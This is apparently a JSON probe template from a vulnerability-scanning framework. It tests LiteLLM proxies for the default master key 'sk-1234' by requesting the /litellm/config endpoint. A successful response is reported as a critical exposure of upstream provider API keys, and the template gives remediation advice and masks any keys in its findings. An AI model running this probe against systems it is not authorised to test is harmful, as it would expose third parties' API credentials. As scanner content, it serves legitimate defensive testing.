{
  "schema": "inkblade-probe-template-v1",
  "key": "litellm-default-key-exfil",
  "version": "1.0.0",
  "meta": {
    "name": {
      "zh": "LiteLLM default master key",
      "en": "LiteLLM default master key"
    },
    "series": "横向利用",
    "min_level": "利用验证",
    "writes": false,
    "requires": [],
    "surfaces": [],
    "cves": [
      "LITELLM-DEFAULT-KEY",
      "CVE-2026-4993"
    ],
    "fidelity": "reduced"
  },
  "inputs": {
    "target": {
      "from": "params.target",
      "required": true
    }
  },
  "defaults": {
    "timeout_ms": 5000,
    "tls_verify": false
  },
  "computed": {
    "success": "steps.config.status == 200 or steps.config.status == 201"
  },
  "steps": [
    {
      "id": "config",
      "op": "http",
      "method": "GET",
      "url": "{{input.target}}/litellm/config",
      "save": "config",
      "allow_failure": true,
      "headers": {
        "Authorization": "Bearer sk-1234"
      }
    },
    {
      "id": "cleanup",
      "op": "http",
      "method": "POST",
      "url": "{{input.target}}/__cleanup__",
      "body": {
        "marker": "{{ctx.marker}}"
      },
      "save": "cleanup",
      "allow_failure": true,
      "when": "params.cleanup != false"
    }
  ],
  "checks": [
    {
      "id": "target-answered",
      "when": "steps.config.status != null",
      "message": "target did not answer"
    }
  ],
  "findings": [
    {
      "id": "cve",
      "when": "computed.success",
      "sev": "critical",
      "title": "LiteLLM 默认/未设置 master key：读取上游 provider key",
      "detail": "{\"http_status\": 200, \"route\": \"\", \"key_class\": \"default\", \"master_key_masked\": \"MOCK****-abc\", \"upstream_key_count\": 1, \"upstream_keys_masked\": [\"MOCK****3456\"], \"upstream_key_tail4\": [\"3456\"], \"masked_only\": true, \"full_key_in_finding\": false, \"upstream_providers\": [\"openai\"], \"cves\": [\"LITELLM-DEFAULT-KEY\"], \"exploit_level\": \"read-only\", \"fix\": \"设置强随机 LITELLM_MASTER_KEY 并轮换所有上游 key\", \"verified\": false, \"verification_status\": \"static-only\", \"verified_cves\": [], \"unverified_cves\": [\"LITELLM-DEFAULT-KEY\"], \"verification_cves\": {\"LITELLM-DEFAULT-KEY\": \"static-only\"}, \"verification_evidence\": []}",
      "cves": [
        "LITELLM-DEFAULT-KEY"
      ],
      "evidence": "{{steps.config.sha256}}",
      "mapping": "CVE arsenal / exploit-registry",
      "fix": "设置强随机 LITELLM_MASTER_KEY 并轮换上游 key",
      "version_matrix": {
        "product": "litellm",
        "source": "steps.config.json.version",
        "vulnerable": [
          "*"
        ],
        "note": "CVE-linked version range; refine per advisory"
      }
    },
    {
      "id": "clean",
      "when": "not computed.success",
      "sev": "info",
      "title": "litellm-default-key-exfil: 未观察到可利用响应（fixed/未部署）",
      "detail": "step=config status={{steps.config.status}}"
    }
  ],
  "artifacts": [
    {
      "name": "litellm-default-key-exfil-trace.json",
      "kind": "json",
      "fields": {
        "module": "'litellm-default-key-exfil'",
        "success": "computed.success",
        "cves": "[\"LITELLM-DEFAULT-KEY\"]",
        "exploit_step": "'config'",
        "status": "steps.config.status"
      }
    }
  ],
  "payloads": {
    "benign": {
      "marker": "INKBLADE-BENIGN"
    },
    "attack": {
      "marker": "{{ctx.marker}}",
      "note": "lab replay only"
    }
  },
  "limits": {
    "timeout_ms": 60000,
    "max_http_requests": 32
  }
}
